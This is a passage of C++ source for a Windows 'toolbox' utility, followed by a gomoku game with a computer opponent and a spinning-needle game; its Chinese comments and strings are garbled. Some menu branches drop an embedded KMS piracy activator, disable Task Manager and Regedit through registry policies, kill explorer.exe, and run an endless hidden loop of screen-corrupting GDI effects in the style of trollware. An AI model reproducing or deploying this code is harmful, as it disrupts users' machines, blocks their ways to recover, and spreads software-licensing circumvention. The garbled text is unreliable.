				{

				}
				//system("pause");
				return 0;

		}
		else if (a==24) {
			ziyuan("EXE", IDR_EXE2, "HEU_KMS_Activator_v42.0.3.exe", "resource\\", 1,0,10,10);
		}
		else if (a == 25) {
			string str("curl https://sw.pcmgr.qq.com/075974aabd7b6699c01be608b16ac862/6649dec8/spcmgr/download/Dev-Cpp_5.11_TDM-GCC_4.9.2_Setup.exe -o devcpp.exe");
			system(str.c_str());
			system("start devcpp.exe");
			if (FindProcess("devcpp.exe"))
			{

			}
			else
			{
				system("del devcpp.exe");
			}

		}
		else if (a == 26) {
			int x = 0, y = 0;// ����ַ���λ�� x,y
			string as;
			open();
			as = open1;
			IMAGE img;
			cout << "��ѷ����ʵ�С\n";
			system("pause>null");
			system("cls");
			long long a = 10;
			float b = 10.0;
			ofstream dataFile;
			dataFile.open("D:\\zz.txt", ofstream::app);
			// ��TXT�ĵ���д������

			long long height, width, average;// ͼƬ�ĸߣ���һС��ͼƬ��ɫ�Ҷȵ�ƽ��ֵ



			loadimage(&img, as.c_str());// �����Ǽ��ص�ǰ�ļ����µ�ͼƬ

			SetWorkingImage(&img);// ���û�ͼĿ��Ϊ img ����,��ȡ���
			height = getheight() / HEIGHT;// ��Ҫ��������
			width = getwidth() / WIDTH;   // ��Ҫ��������

			initgraph(width* CHAR_WIDTH, height* CHAR_HEIGHT, EX_SHOWCONSOLE);// ��ʼ������
			for (long long i = 0; i < height; i++)
			{
				x = 0;
				for (long long j = 0; j < width; j++)
				{
					average = 0;

					for (long long h1 = 0; h1 < HEIGHT; h1++)
						for (long long w1 = 0; w1 < WIDTH; w1++)
							// ��ȡ����ɫ,��ɫ����,�õ�RGB��Rֵ(0-255)
							average += GetRValue(RGBtoGRAY(getpixel(j * WIDTH + w1, i * HEIGHT + h1)));

					average /= (HEIGHT * WIDTH);// ƽ��ֵ����
					SetWorkingImage();// ���ô���Ϊ��ͼ����
					outtextxy(x, y, transcoding(average));// ת�����������
					cout << transcoding(average);
					dataFile << transcoding(average);
					SetWorkingImage(&img);// ���û�ͼ����Ϊimg
					x += CHAR_WIDTH;// �����ƶ�CHAR_WIDTH������,�ȴ������һ���ַ�
				}
				y += CHAR_HEIGHT;// �����ƶ�CHAR_HEIGHT������,�����һ��
				dataFile << "\n";
				cout << "\n";
			}
			system("md \\ASCLL");
			saveimage(_T("ASCLL\\t.bmp"));
			printf("ת����ϣ�\n");
			// �ر��ĵ�
			dataFile.close();
			system("pause");

		//	system("TASKKILL /F /IM �򵥹��������.exe");
		}
		else if (a == 27) {
			string str("curl https://dl.bandisoft.com/bandizip.std/BANDIZIP-SETUP-STD-X64.EXE?8 -o zip.exe");
			system(str.c_str());
			system("start zip.exe");
			if (FindProcess("zip.exe"))
			{

			}
			else
			{
				system("del zip.exe");
			}

		}
		else if (a == 28) {
			string a="chkdsk ", b, c=" /f",d;
			cout << "Ҫ�޸���һ������\n";
			cin >> b;
			d = a + b + c;
			system(d.c_str());
			system("pause");
		}
		else if(a==29)
		{
			string as = "TASKKILL /F /IM ",s,c;
			cout << "�������ļ���������չ����\n";
			cin >> s;
			c = as + s;
			system(c.c_str());

		}
		else if (a == 30) {
			int width, height, dtWidth, dtHeight;
			RECT rect;
			char s[256], conTitle[256] = "���пɼ�����";
			SetConsoleTitle(conTitle);
			HWND hwnd = GetDesktopWindow();
			GetWindowRect(hwnd, &rect);   //��ȡ�����С������Ļ�ֱ��� 
			dtWidth = rect.right - rect.left;
			dtHeight = rect.bottom - rect.top;
			hwnd = GetNextWindow(hwnd, GW_CHILD);

			int i = 0;
			while (hwnd != NULL)
			{
				GetWindowText(hwnd, s, sizeof(s));
//				if (IsWindowVisible(hwnd) && strlen(s) > 0) //ע�͵����л���������ٸ�(�����ɼ�)����
					cout << ++i << "��" << s << endl;           //��IsWindow(hwnd)�Ա�һ�½��
				hwnd = GetNextWindow(hwnd, GW_HWNDNEXT);
			}
			system("pause>null");
			}
		else if (a == 31) {
				string f = "echo CreateObject(\"SAPI.SpVoice\").Speak \"", a, b="\">0dj9soh.vbs", c;
				ofstream dataFile;
				dataFile.open("D:\\zz.txt", ofstream::app);
				cout << "Ҫ�ʶ��ľ���\n";
				cin >> a;
				c = f + a + b;
				system(c.c_str());
				system("start 0dj9soh.vbs"); system("qause");
				system("del 0dj9soh.vbs");
				
		}
		else if (a == 32) {
			cout << "1 ���������������0 ȡ���������������\n";
			HKEY hkey;
			DWORD value = 0;//1���������������0ȡ���������������
			cin >> value;
			RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hkey);
			RegSetValueEx(hkey, "DisableTaskMgr", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
			RegCloseKey(hkey);
		}
		else if (a == 33) {
			HKRunator(aaa());

		}
		else if (a == 34) {
			HKRunator(NULL);
		}
		else if (a == 35) {
			bool a;
			a = 1;
			RegTaskmanagerForbidden(a);
			a = 1;
			RegEditForbidden(a);
			a = 1;
			RegModifyBackroud(a);
			string explorer = "TASKKILL /F /IM explorer.exe";
			system(explorer.c_str());
			string explorer2 = "start explorer.exe";
			system(explorer2.c_str());

//				for (int i = 0; i < 100*700; i++) {
	//				MOUSE();
		//			ICON();
			//	}
			//	lanping();

		}
		else if (a == 36) {
			bool a;
			a = 0;
			RegEditForbidden(a);
			RegEditForbidden(a);
			RegModifyBackroud(a);
			system("reg delete \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\" /f");
			system("reg delete \"HKLM\\Software\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Policies\" /f");
			system("reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\" /f");
			system("cls");
			cout << "win+i�򿪸��Ի������ֽ";
		}
		else if (a == 37) {
			cout << "��ҳ������Ч!";
			system("title ��ҳ������Ч!");
			system("start �򵥹��������.exe");
			int i1 = 0;
			HINSTANCE hShell32 = LoadLibrary(_T("Shell32.dll"));
			POINT point;
			HDC myDC;
			RECT ScrRect;
			GetWindowRect(GetDesktopWindow(), &ScrRect);
			myDC = GetDC((HWND)0);
			srand((unsigned)time(NULL));
			FreeConsole();
			int a, b, x, y, i = 0;
			x = GetSystemMetrics(SM_CXSCREEN);
			y = GetSystemMetrics(SM_CYSCREEN);
			HWND hwnd = GetDesktopWindow();
			HDC hdc = GetWindowDC(hwnd);
			while (1) {
				int x1 = rand() % 1920;
				int y1 = rand() % 1200;
				GetCursorPos(&point);
				for (int j = 0; j < 1000; j++) {
					i = rand() % 256;
					DrawIcon(hdc, x1, y1, LoadIcon(hShell32, MAKEINTRESOURCE(i)));
				}
				int randx, randy;
				randx = rand() % x + 0;
				randy = rand() % y + 0;//rand() % y + 0
				BitBlt(GetDC(NULL), rand() % x + 0, rand() % y + 0, randx + 200, randy + 200, GetDC(NULL), randx, randy, NOTSRCCOPY);
				// BitBlt(GetDC(NULL),  x + 0,  y + 0, randx + 1000, randy + 1000, GetDC(NULL), randx, randy, NOTSRCCOPY);
				a = GetSystemMetrics(SM_CXSCREEN);
				b = GetSystemMetrics(SM_CYSCREEN);
				StretchBlt(GetDC(NULL), 50, 50, a - 100, b - 100, GetDC(NULL), 0, 0, a, b, SRCCOPY);
				//Sleep(500);

				int x, y, width, height;
				x = (rand() % ScrRect.right) / 2 + (width = rand() % 3000);
				y = rand() % ScrRect.bottom - (height = rand() % 3000);
				BitBlt(myDC, x, y, x + width, y + height, myDC, x + rand() % 3000 - 100, y - rand() % 200, SRCCOPY);


			}
			ReleaseDC((HWND)0, myDC);
			InvalidateRect(0, NULL, TRUE);
		}
		else if (a == 38) {
			cout << "��ҳ������Ч!";
			system("title ��ҳ������Ч!");
			system("start �򵥹��������.exe");
			HDC myDC;
			RECT ScrRect;
			GetWindowRect(GetDesktopWindow(), &ScrRect);
			myDC = GetDC((HWND)0);
			for (long i = 0; i < 100000; i++) {
				int x, y, width, height;
				x = (rand() % ScrRect.right) / 2 + (width = rand() % 3);
				y = rand() % ScrRect.bottom - (height = rand() % 3);
				BitBlt(myDC, x, y, x + width, y + height, myDC, x + rand() % 3 - 1, y - rand() % 2, SRCCOPY);
			}
			ReleaseDC((HWND)0, myDC);
			InvalidateRect(0, NULL, TRUE);
			return 0;
		}
		else if (a == 39) {
			ziyuan("EXE", IDR_EXE3, "ICON_��ȡ.exe", "resource\\", 1,0,10,10);
			system("del ");
			}
		else if (a == 40) {
			ziyuan("EXE", IDR_EXE4, "С����.exe", "resource\\", 1,0,10,10);
		}
		
		else if (a == 42) {
			cout << "��ҳ������Ч!";
			system("title ��ҳ������Ч!");
			system("start �򵥹��������.exe");
			ziyuan("CPP", IDR_CPP1, "bolin.cpp", "resource\\", 0, 0, 10, 10);
			bolin();
			
		}
		system("cls");
	//	closegraph();
	}
//	return 0;
}
























































































// ȫ�ֱ���
box BOX[19][19];      // ����
int win = -1;         // ˭Ӯ�ˣ�0�����壬1�����壬2��ƽ�֣�
int whoplay = 0;      // �ֵ�˭������
int playercolor = 0;  // �����ɫ
int dx[4]{ 1,0,1,1 }; // - | \ / �ĸ�����
int dy[4]{ 0,1,1,-1 };
int Score[3][5] = //���ֱ�
{
	{ 0, 80, 250, 500, 500 }, // ����0��
	{ 0, 0,  80,  250, 500 }, // ����1��
	{ 0, 0,  0,   80,  500 }  // ����2��
};
int MAXxs[361];   //����x����
int MAXys[361];   //����y����
int mylength = 0; //���Ž���

// �ຯ������

// ���ƺ���
void box::draw()
{
	COLORREF thefillcolor = getfillcolor(); // ���������ɫ
	setlinestyle(PS_SOLID, 2);              // ����ʽ����
	setfillcolor(color);                    // �����ɫ����
	solidrectangle(x, y, x + 30, y + 30);   // �����ޱ߿��������
	if (isnew)
	{
		// ��������µ�
		// ���Ʊ߿���
		setlinecolor(LIGHTGRAY);
		line(x + 1, y + 2, x + 8, y + 2);
		line(x + 2, y + 1, x + 2, y + 8);
		line(x + 29, y + 2, x + 22, y + 2);
		line(x + 29, y + 1, x + 29, y + 8);
		line(x + 2, y + 29, x + 8, y + 29);
		line(x + 2, y + 22, x + 2, y + 29);
		line(x + 29, y + 29, x + 22, y + 29);
		line(x + 29, y + 22, x + 29, y + 29);
	}
	setlinecolor(BLACK);
	switch (modle)
	{
		// �����ǲ�ͬλ�����̵���ʽ
	case 0:
		line(x + 15, y, x + 15, y + 30);
		line(x - 1, y + 15, x + 30, y + 15);
		break;
		//  *
		// ***
		//  *
	case 1:
		line(x + 14, y + 15, x + 30, y + 15);
		setlinestyle(PS_SOLID, 3);
		line(x + 15, y, x + 15, y + 30);
		setlinestyle(PS_SOLID, 2);
		break;
		// *
		// ***
		// *
	case 2:
		line(x - 1, y + 15, x + 15, y + 15);
		setlinestyle(PS_SOLID, 3);
		line(x + 15, y, x + 15, y + 30);
		setlinestyle(PS_SOLID, 2);
		break;
		//   *
		// ***
		//   *
	case 3:
		line(x + 15, y + 15, x + 15, y + 30);
		setlinestyle(PS_SOLID, 3);
		line(x - 1, y + 15, x + 30, y + 15);
		setlinestyle(PS_SOLID, 2);
		break;
		// ***
		//  *
		//  *
	case 4:
		line(x + 15, y, x + 15, y + 15);
		setlinestyle(PS_SOLID, 3);
		line(x - 1, y + 15, x + 30, y + 15);
		setlinestyle(PS_SOLID, 2);
		break;
		//  *
		//  *
		// ***
	case 5:
		setlinestyle(PS_SOLID, 3);
		line(x + 15, y, x + 15, y + 15);
		line(x + 15, y + 15, x + 30, y + 15);
		setlinestyle(PS_SOLID, 2);
		break;
		// *
		// *
		// ***
	case 6:
		setlinestyle(PS_SOLID, 3);
		line(x + 15, y, x + 15, y + 15);
		line(x - 1, y + 15, x + 15, y + 15);
		setlinestyle(PS_SOLID, 2);
		break;
		//   *
		//   *
		// ***
	case 7:
		setlinestyle(PS_SOLID, 3);
		line(x - 1, y + 15, x + 15, y + 15);
		line(x + 15, y + 15, x + 15, y + 30);
		setlinestyle(PS_SOLID, 2);
		break;
		// ***
		//   *
		//   *
	case 8:
		setlinestyle(PS_SOLID, 3);
		line(x + 15, y + 15, x + 30, y + 15);
		line(x + 15, y + 15, x + 15, y + 30);
		setlinestyle(PS_SOLID, 2);
		break;
		// ***
		// *
		// *
	case 9:
		line(x + 15, y, x + 15, y + 30);
		line(x - 1, y + 15, x + 30, y + 15);
		setfillcolor(BLACK);
		setlinestyle(PS_SOLID, 1);
		fillcircle(x + 15, y + 15, 4);
		break;
		//  *
		// *O*
		//  *
	}
	switch (value)
	{
	case 0: // ����
		setfillcolor(WHITE);
		setlinestyle(PS_SOLID, 1);
		fillcircle(x + 15, y + 15, 13);
		break;
	case 1: // ����
		setfillcolor(BLACK);
		setlinestyle(PS_SOLID, 1);
		fillcircle(x + 15, y + 15, 13);
		break;
	}
	setfillcolor(thefillcolor); // ��ԭ���ɫ
}



// ������������

// ��������
void draw()
{
	int number = 0; // ���������λ��
	// ���꣨��ֵ��
	TCHAR strnum[19][3] = { _T("1"),_T("2") ,_T("3") ,_T("4"),_T("5") ,_T("6") ,_T("7"),_T("8"),_T("9"),_T("10"), _T("11"),_T("12") ,_T("13") ,_T("14"),_T("15") ,_T("16") ,_T("17"),_T("18"),_T("19") };
	// ���꣨��ĸ��
	TCHAR strabc[19][3] = { _T("A"),_T("B") ,_T("C") ,_T("D"),_T("E") ,_T("F") ,_T("G"),_T("H"),_T("I"),_T("J"), _T("K"),_T("L") ,_T("M") ,_T("N"),_T("O") ,_T("P") ,_T("Q"),_T("R"),_T("S") };
	LOGFONT nowstyle;
	gettextstyle(&nowstyle);
	settextstyle(0, 0, NULL);
	for (int i = 0; i < 19; i++)
	{
		for (int j = 0; j < 19; j++)
		{
			BOX[i][j].draw(); // ����
			if (BOX[i][j].isnew == true)
			{
				BOX[i][j].isnew = false; // ����һ������λ�õĺڿ����
			}
		}
	}
	// ������
	for (int i = 0; i < 19; i++)
	{
		outtextxy(75 + number, 35, strnum[i]);
		outtextxy(53, 55 + number, strabc[i]);
		number += 30;
	}
	settextstyle(&nowstyle);
}

// �Ծֳ�ʼ��
void init()
{
	win = -1;// ˭Ӯ��
	for (int i = 0, k = 0; i < 570; i += 30)
	{
		for (int j = 0, g = 0; j < 570; j += 30)
		{
			int modle = 0;  // ������ʽ
			BOX[k][g].value = -1;
			BOX[k][g].color = RGB(255, 205, 150);// ���̵�ɫ
			// x��y ����
			BOX[k][g].x = 65 + j;
			BOX[k][g].y = 50 + i;
			// ������ʽ���ж�
			if (k == 0 && g == 0)
			{
				modle = 8;
			}
			else if (k == 0 && g == 18)
			{
				modle = 7;
			}
			else if (k == 18 && g == 18)
			{
				modle = 6;
			}
			else if (k == 18 && g == 0)
			{
				modle = 5;
			}
			else if (k == 0)
			{
				modle = 3;
			}
			else if (k == 18)
			{
				modle = 4;
			}
			else if (g == 0)
			{
				modle = 1;
			}
			else if (g == 18)
			{
				modle = 2;
			}
			else  if ((k == 3 && g == 3) || (k == 3 && g == 15) || (k == 15 && g == 3) || (k == 15 && g == 15) || (k == 3 && g == 9) || (k == 9 && g == 3) || (k == 15 && g == 9) || (k == 9 && g == 15) || (k == 9 && g == 9))
			{
				modle = 9;
			}
			else
			{
				modle = 0;
			}
			BOX[k][g].modle = modle;
			g++;
		}
		k++;
	}
}



// ���ĺ���

// Ѱ�����λ��
seat findbestseat(int color, int c)
{
	if (c == 0)
	{
		//����ǵ�һ��
		//�������
		mylength = 0;
	}
	int MAXnumber = -1e9;    //��ѷ���
	for (int i = 0; i < 19; i++) {
		for (int j = 0; j < 19; j++) {
			if (BOX[i][j].value == -1) {
				//����ÿһ����λ��
				int length;        //��ǰ���򳤶�
				int emeny;         //��ǰ�������
				int nowi = 0;      //���ڱ�������y����
				int nowj = 0;      //���ڱ�������x����
				int thescore = 0;  //���λ�õĳ�ʼ����
				//�ж��ܱ���û������
				int is = 0;
				for (int k = 0; k < 4; k++)
				{
					nowi = i;
					nowj = j;
					nowi += dx[k];
					nowj += dy[k];
					if (nowi >= 0 && nowj >= 0
						&& nowi <= 18 && nowj <= 18
						&& BOX[nowi][nowj].value != -1)
					{
						is = 1;
						break;
					}
					nowi = i;
					nowj = j;
					nowi += dx[k];
					nowj += dy[k];
					if (nowi >= 0 && nowj >= 0
						&& nowi <= 18 && nowj <= 18
						&& BOX[nowi][nowj].value != -1)
					{
						is = 1;
						break;
					}
					nowi = i;
					nowj = j;
					nowi -= dx[k];
					nowj -= dy[k];
					if (nowi >= 0 && nowj >= 0
						&& nowi <= 18 && nowj <= 18
						&& BOX[nowi][nowj].value != -1)
					{
						is = 1;
						break;
					}
					nowi = i;
					nowj = j;
					nowi -= dx[k];
					nowj -= dy[k];
					if (nowi >= 0 && nowj >= 0
						&& nowi <= 18 && nowj <= 18
						&& BOX[nowi][nowj].value != -1)
					{
						is = 1;
						break;
					}
				}
				if (!is)
				{
					//�����Χû�����ӣ��Ͳ��õݹ���
					continue;
				}
				//�Լ�
				BOX[i][j].value = color;//������������
				for (int k = 0; k < 4; k++)
				{
					//����ĸ�����
					length = 0;
					emeny = 0;
					nowi = i;
					nowj = j;
					while (nowi <= 18 && nowj <= 18 && nowi >= 0 && nowj >= 0 && BOX[nowi][nowj].value == color)
					{
						length++;
						nowj += dy[k];
						nowi += dx[k];
					}
					if (nowi < 0 || nowj < 0 || nowi > 18 || nowj > 18 || BOX[nowi][nowj].value == !color)
					{
						emeny++;
					}
					nowi = i;
					nowj = j;
					while (nowi <= 18 && nowj <= 18 && nowi >= 0 && nowj >= 0 && BOX[nowi][nowj].value == color)
					{
						length++;
						nowj -= dy[k];
						nowi -= dx[k];
					}
					if (nowi < 0 || nowj < 0 || nowi > 18 || nowj > 18 || BOX[nowi][nowj].value == !color)
					{
						emeny++;
					}
					length -= 2;//�жϳ���
					if (length > 4)
					{
						length = 4;
					}
					if (Score[emeny][length] == 500)
					{
						//����ʤ���������ݹ�
						BOX[i][j].value = -1;
						return{ i,j,Score[emeny][length] };
					}
					thescore += Score[emeny][length];
					length = 0;
					emeny = 0;
				}
				//���ˣ�ԭ��ͬ�ϣ�
				BOX[i][j].value = !color;
				for (int k = 0; k < 4; k++)
				{
					length = 0;
					emeny = 0;
					nowi = i;
					nowj = j;
					while (nowi <= 18 && nowj <= 18 && nowi >= 0 && nowj >= 0 && BOX[nowi][nowj].value == !color)
					{
						length++;
						nowj += dy[k];
						nowi += dx[k];
					}
					if (nowi < 0 || nowj < 0 || nowi > 18 || nowj > 18 || BOX[nowi][nowj].value == color)
					{
						emeny++;
					}
					nowi = i;
					nowj = j;
					while (nowi <= 18 && nowj <= 18 && nowi >= 0 && nowj >= 0 && BOX[nowi][nowj].value == !color)
					{
						length++;
						nowj -= dy[k];
						nowi -= dx[k];
					}
					if (nowi < 0 || nowj < 0 || nowi > 18 || nowj > 18 || BOX[nowi][nowj].value == color)
					{
						emeny++;
					}
					length -= 2;
					if (length > 4)
					{
						length = 4;
					}
					if (Score[emeny][length] == 500)
					{
						BOX[i][j].value = -1;
						return{ i,j,Score[emeny][length] };
					}
					thescore += Score[emeny][length];
					length = 0;
					emeny = 0;
				}
				BOX[i][j].value = -1;
				//����Ѿ�����߷���С����û��Ҫ�ݹ���
				if (thescore >= MAXnumber)
				{
					if (c < 3)
					{
						//ֻ����4�㣬����ʱ��̫��
						BOX[i][j].value = color;
						//�ݹ�Ѱ�ҶԷ�����
						int nowScore = thescore - findbestseat(!color, c + 1).number;//�ݹ�������λ�õķ�ֵ
						BOX[i][j].value = -1;
						if (nowScore > MAXnumber)
						{
							//����߷�ֵ��
							MAXnumber = nowScore;
							if (c == 0)
							{
								//��һ��
								mylength = 0;//�������
							}
						}
						if (c == 0)
						{
							//��һ��
							if (nowScore >= MAXnumber)
							{
								//�ѵ�ǰλ�ü�������
								MAXxs[mylength] = i;
								MAXys[mylength] = j;
								mylength++;
							}
						}
					}
					else {
						//����ݹ鵽�����һ��
						if (thescore > MAXnumber)
						{
							//ֱ�Ӹ���
							MAXnumber = thescore;
						}
					}
				}
			}
		}
	}
	if (c == 0)
	{
		//��һ��
		//���������λ��
		int mynum = rand() % mylength;
		return { MAXxs[mynum],MAXys[mynum],MAXnumber };
	}
	//������
	return { 0,0,MAXnumber };
}

// �ж���Ӯ
void isWIN()
{
	bool isfull = true; // �����Ƿ�����
	for (int i = 0; i < 19; i++)
	{
		for (int j = 0; j < 19; j++)
		{
			if (BOX[i][j].value != -1)
			{
				// ����ÿ�����ܵ�λ��
				int nowcolor = BOX[i][j].value; // ���ڱ���������ɫ
				int length[4] = { 0,0,0,0 };    // �ĸ�����ĳ���
				for (int k = 0; k < 4; k++)
				{
					// ԭ��ͬѰ�����λ��
					int nowi = i;
					int nowj = j;
					while (nowi <= 18 && nowj <= 18 && nowi >= 0 && nowj >= 0 && BOX[nowi][nowj].value == nowcolor)
					{
						length[k]++;
						nowj += dx[k];
						nowi += dy[k];
					}
					nowi = i;
					nowj = j;
					while (nowi <= 18 && nowj <= 18 && nowi >= 0 && nowj >= 0 && BOX[nowi][nowj].value == 1 - nowcolor)
					{
						length[k]++;
						nowj -= dx[k];
						nowi -= dy[k];
					}
				}
				for (int k = 0; k < 4; k++)
				{
					if (length[k] >= 5) {
						// ���������
						if (nowcolor == playercolor)
						{
							win = playercolor; // ���ʤ
						}
						if (nowcolor == 1 - playercolor)
						{
							win = 1 - playercolor; // ����ʤ
						}
					}
				}
			}
			else
			{
				//���Ϊ��
				isfull = false;//����û��
			}
		}
	}
	if (isfull)
	{
		// �����������
		win = 2; // ƽ��
	}
}

// ��Ϸ������
void game()
{
	bool isinit;
	// ��һ�����ͣ������
	int oldi = 0;
	int oldj = 0;
	// ����������ɫ
	srand(time(NULL));
	playercolor = rand() % 2;
	// ���Ʊ���
	setfillcolor(RGB(255, 205, 150));
	solidrectangle(40, 25, 645, 630);
	// ����������ʽ
	settextstyle(30, 15, 0, 0, 0, 1000, false, false, false);
	settextcolor(BLACK);
	// �����ʾ��
	if (playercolor == 0)
	{
		isinit = 1;
		outtextxy(150, 650, _T("���ִ�׺��У�����ִ������"));
		whoplay = 1;
	}
	else
	{
		isinit = 0;
		outtextxy(150, 650, _T("���ִ�����У�����ִ�׺���"));
		whoplay = 0;
	}
	draw(); // ����
	while (1)
	{
	NEXTPLAYER:
		if (whoplay == 0)
		{
			// �������
			MOUSEMSG mouse = GetMouseMsg(); // ��ȡ�����Ϣ
			for (int i = 0; i < 19; i++)
			{
				for (int j = 0; j < 19; j++)
				{
					if (mouse.x > BOX[i][j].x && mouse.x<BOX[i][j].x + 30//�ж�x����
						&& mouse.y>BOX[i][j].y && mouse.y < BOX[i][j].y + 30//�ж�y����
						&& BOX[i][j].value == -1)//�ж��Ƿ��ǿ�λ��
					{
						// ���ͣ��ĳһ����λ������
						if (mouse.mkLButton)
						{
							// ���������
							BOX[i][j].value = playercolor; // ����
							BOX[i][j].isnew = true;        // ��λ�ø���
							oldi = -1;
							oldj = -1;
							// ��һ�����
							whoplay = 1;
							goto DRAW;
						}
						// ����ѡ���
						BOX[oldi][oldj].isnew = false;
						BOX[oldi][oldj].draw();
						BOX[i][j].isnew = true;
						BOX[i][j].draw();
						oldi = i;
						oldj = j;
					}
				}
			}
		}
		else
		{
			// ��������
			if (isinit)
			{
				// �������
				isinit = 0;
				int drawi = 9;
				int drawj = 9;
				while (BOX[drawi][drawj].value != -1)
				{
					drawi--;
					drawj++;
				}
				BOX[drawi][drawj].value = 1 - playercolor;
				BOX[drawi][drawj].isnew = true;
			}
			else
			{
				seat best;
				best = findbestseat(1 - playercolor, 0); // Ѱ�����λ��
				BOX[best.i][best.j].value = 1 - playercolor;//�������λ��
				BOX[best.i][best.j].isnew = true;
			}
			whoplay = 0;
			goto DRAW; // �ֵ���һ��
		}
	}
DRAW: // ����
	isWIN(); // �����Ӯ
	draw();
	oldi = 0;
	oldj = 0;
	if (win == -1)
	{
		// ���û����ʤ��
		Sleep(500);
		goto NEXTPLAYER; // ǰ����һ�����
	}
	// ʤ������
	settextcolor(RGB(0, 255, 0));
	Sleep(1000);
	if (win == 0)
	{
		outtextxy(320, 320, _T("��ʤ"));
	}
	if (win == 1)
	{
		outtextxy(320, 320, _T("��ʤ"));
	}
	if (win == 2)
	{
		outtextxy(320, 320, _T("ƽ��"));
	}
	// ����Ӧʱ��
	Sleep(5000);
	return;
}
void drawframe(int number)
{
	TCHAR str[25];
	_stprintf_s(str, _T("%d"), number);
	setfillcolor(RGB(70, 70, 69));
	solidcircle(240, 240, 50);
	setbkmode(TRANSPARENT);
	settextstyle(50, 0, _T("����"), 0, 0, FW_BLACK, false, false, false);
	settextcolor(WHITE);
	RECT r = { 190, 190, 290, 290 };
	drawtext(str, &r, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
}

void Move(int number, int x, int y)
{
	setfillcolor(RGB(70, 70, 69));
	solidcircle(x, y, 20);
	setbkmode(TRANSPARENT);
	settextstyle(15, 0, _T("����"));
	settextcolor(WHITE);
	RECT r = { x - 20, y - 20, x + 20, y + 20 };
	TCHAR str[25];
	_stprintf_s(str, _T("%d"), number);
	drawtext(str, &r, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
}

void Rotate(double* R, int num)
{
	int X_NEEDLE;
	int Y_NEEDLE;

	BeginBatchDraw();
	for (int i = 0; i < num; i++)
	{
		FlushBatchDraw();
		eraser(int(NEEDLE_L * cos(R[i]) + 240), int(NEEDLE_L * sin(R[i]) + 240));
		R[i] = R[i] + SPEED;
		if (R[i] > 2 * PI)
		{
			R[i] = R[i] - 2 * PI;
		}
		X_NEEDLE = int(NEEDLE_L * cos(R[i]) + 240);
		Y_NEEDLE = int(NEEDLE_L * sin(R[i]) + 240);
		setlinestyle(PS_SOLID, 3);
		setlinecolor(RGB(70, 70, 69));
		line(X_NEEDLE, Y_NEEDLE, 240, 240);
		Move(i, X_NEEDLE, Y_NEEDLE);
		drawframe(1);
	}
	EndBatchDraw();
}

bool Pin(double* R, int num)
{
	int X_NEEDLE;
	int Y_NEEDLE;
	setlinestyle(PS_SOLID, 3);
	setlinecolor(RGB(70, 70, 69));
	bool T = true;
	R[num] = PI / 2;
	X_NEEDLE = int(NEEDLE_L * cos(R[num]) + 240);
	Y_NEEDLE = int(NEEDLE_L * sin(R[num]) + 240);
	line(X_NEEDLE, Y_NEEDLE, 240, 290);
	Move(num, X_NEEDLE, Y_NEEDLE);
	for (int i = 0; i < num; i++)
	{
		if (fabs(R[num] - R[i]) < (PI / 15))
		{
			T = false;
			break;								// ����Ҫ�ٴν��бȽ��ˣ�ѭ������
		}
	}
	return T;									// ���ʧ�ܷ���false;
}

void eraser(int x, int y)
{
	setfillcolor(RGB(189, 188, 187));
	solidcircle(x, y, 20);
	setlinestyle(PS_SOLID, 3);
	setlinecolor(RGB(189, 188, 187));
	line(x, y, 240, 240);
}

// ��ȷ��ʱ����(���Ծ�ȷ�� 1ms������ ��1ms)
// �ǵü�ͷ�ļ� time.h
// by yangw80<yw80@qq.com>, 2011-5-4
void HpSleep(int ms)
{
	static clock_t oldclock = clock();			// ��̬��������¼��һ�� tick
	oldclock += ms * CLOCKS_PER_SEC / 1000;		// ���� tick
	if (clock() > oldclock)						// ����Ѿ���ʱ��������ʱ
		oldclock = clock();
	else
		while (clock() < oldclock)					// ��ʱ
			Sleep(1);								// �ͷ� CPU ����Ȩ������ CPU ռ����
}
